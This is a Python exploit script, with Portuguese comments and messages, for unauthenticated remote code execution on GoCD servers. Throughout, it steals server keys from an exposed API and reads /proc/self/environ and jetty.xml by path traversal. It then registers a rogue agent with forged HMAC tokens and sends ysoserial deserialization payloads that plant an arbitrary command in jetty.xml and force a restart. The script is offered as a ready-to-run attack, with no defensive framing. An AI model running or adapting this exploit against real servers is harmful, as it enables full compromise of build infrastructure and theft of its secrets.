#!/usr/bin/python3

import requests
import subprocess
import os
import argparse
import xml.etree.ElementTree as ET
import sys
import hmac
import hashlib 
import base64
import uuid

def authorization(uuid, tokenGenerationKey):
    return base64.b64encode(hmac.new(str.encode(tokenGenerationKey), str.encode(uuid), digestmod=hashlib.sha256).digest())

parser = argparse.ArgumentParser(description="GoCD Exploit RCE No Auth")
parser.add_argument("-c", help="Comando", required=True)
parser.add_argument("-t", help="URL (Eg: http://gocd.example.com)", required=True)
args = parser.parse_args()

gocd_url = args.t
command = str(args.c)

new_jetty_lines = []
exploit =   f"    <Call class=\"java.lang.Runtime\" name=\"getRuntime\">\n"
exploit +=  f"        <Call name=\"exec\">\n"
exploit +=  f"            <Arg>{command}</Arg>\n"
exploit +=  f"        </Call>\n"
exploit +=  f"    </Call>\n"
exploit = exploit.split("\n")

session = requests.Session()
requests.packages.urllib3.disable_warnings()

print("[1] Verificando arquivo cruise_config")
r = session.get(f"{gocd_url}/go/add-on/business-continuity/api/cruise_config", verify=False)
cruise_config = ET.fromstring(r.text)

if r.status_code != 200:
    exit(f"Falha ao acessar arquivo:{r.text}")
else:
    print("Arquivo cruise_config acessível")
    print("")
    
chaves_servidor = cruise_config[0].attrib

print("[2] Lendo atributos do servidor")

for key, value in chaves_servidor.items():
    print(f"{key}: {value}")

print("")

agentAutoRegisterKey = chaves_servidor["agentAutoRegisterKey"]

print("[3] Verificando arquivo variáveis de ambiente do processo")
r = session.get(f"{gocd_url}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../proc/self/environ", verify=False)

if r.status_code != 200:
    exit(f"Falha ao acessar arquivo:{r.text}")
else:
    print("Arquivo acessível")
    print("")

'''variaveis_ambiente = []

for x in r.text[:-1].split("\x00"):
    print(x.split("="))
    
    for key, value in x.split("="):
        print(f"{key}: {value}")
        variaveis_ambiente[key] = value

print(variaveis_ambiente)'''

variaveis_ambiente = dict(x.split("=") for x in r.text[:-1].split("\x00"))

jetty_file = f"/etc/go/jetty.xml"

print("[4] Verificando arquivo jetty.xml")
r = session.get(f"{gocd_url}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../{jetty_file}", verify=False)

if r.status_code != 200:
    exit(f"Falha ao acessar arquivo:{r.text}")
else:
    print("Arquivo acessível")
    print("")

print("[5] Criando backup do arquivo jetty.xml")

orig_jetty = open("bkp_orig_jetty.xml","w")
orig_jetty.write(r.text)
orig_jetty.close()

print("Backup criado")
print("")

print("[6] Criando arquivo exploit_jetty.xml")

orig_jetty = open("bkp_orig_jetty.xml", "r")
orig_jetty_lines = orig_jetty.read().splitlines()

for line in orig_jetty_lines:
    if "</Configure>" not in line:
        new_jetty_lines.append(line)
    else:
        for line in exploit:
            new_jetty_lines.append(line)
        new_jetty_lines.append("</Configure>")

with open(r"exploit_jetty.xml", "w") as exploit_jetty:
    for line in new_jetty_lines:
        exploit_jetty.write("%s\n" % line)

print("Arquivo criado")
print("")

print("[7] Registrando novo agent")
print("Gerando token do agent")

agent_guid = str(uuid.uuid4())
agentAutoRegisterKey = chaves_servidor["agentAutoRegisterKey"]

r = session.get(f"{gocd_url}/go/admin/agent/token?uuid={agent_guid}", verify=False)

if r.status_code != 200:
    exit(f"Falha ao gerar token do agent:{r.text}")
else:
    print("Token gerado")
    agent_token = r.text
    print("")

print("Registrando novo agent")

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}

dados_agent = {
    "hostname": "gocd_rce_noauth",
    "uuid": agent_guid,
    "location": "go",
    "usablespace": 246167605248,
    "operatingSystem": "Alpine Linux v3.10",
    "agentAutoRegisterKey": agentAutoRegisterKey,
    "agentAutoRegisterResources": "",
    "agentAutoRegisterEnvironments": "",
    "agentAutoRegisterHostname": "",
    "elasticAgentId": "",
    "elasticPluginId": "",
    "token": agent_token
}

r = session.post(f"{gocd_url}/go/admin/agent", headers=headers, data=dados_agent, verify=False)

if r.status_code != 200:
    exit(f"Falha registrar agent:{r.text}")
else:
    print("Agent registrado")
    print(f"Dados do agent: {dados_agent}")
    print("")

if sys.platform == "win32":
    jdk_dir = ".\\openlogic-openjdk-8u332-b09-windows-32\\bin\\"
else:
    jdk_dir = "./openlogic-openjdk-8u332-b09-linux-x32/bin/"

print("[8] Serializando objetos")

try:
    AspectJWeaverFileUpload1 = subprocess.run([f"{jdk_dir}java", "-jar", "ysoserial.jar", "AspectJWeaverFileUpload1", f"{os.path.realpath('exploit_jetty.xml')};{jetty_file}"], capture_output=True)
    AspectJWeaverFileRead1 = subprocess.run([f"{jdk_dir}java", "-jar", "ysoserial.jar", "AspectJWeaverFileRead1", f"/dev/random"], capture_output=True)

    print("Objetos serializados")
    print("")
except:
    exit(f"Falha ao serializar objetos")

print("[9] Enviando objetos serializados")
print("Enviando exploit_jetty.xml")

authorization_header = authorization(agent_guid, chaves_servidor["tokenGenerationKey"])

headers = {
    "Content-Type": "application/x-java-serialized-object",
    "Authorization": authorization_header,
    "X-Agent-GUID": agent_guid
}

r = session.post(f"{gocd_url}/go/remoting/remoteBuildRepository", headers=headers, data=AspectJWeaverFileUpload1.stdout, verify=False)

#print(r)
#print(r.text)

if r.status_code != 500:
    exit(f"Falha enviar arquivo serializado")
else:
    print("Arquivo enviado")
    print("")

print("Enviando comando para forçar reinicialização")

r = session.post(f"{gocd_url}/go/remoting/remoteBuildRepository", headers=headers, data=AspectJWeaverFileRead1.stdout, verify=False)

if r.status_code != 500:
    exit(f"Falha enviar arquivo serializado")
else:
    print("Aguardando reinicialização")
    print("")
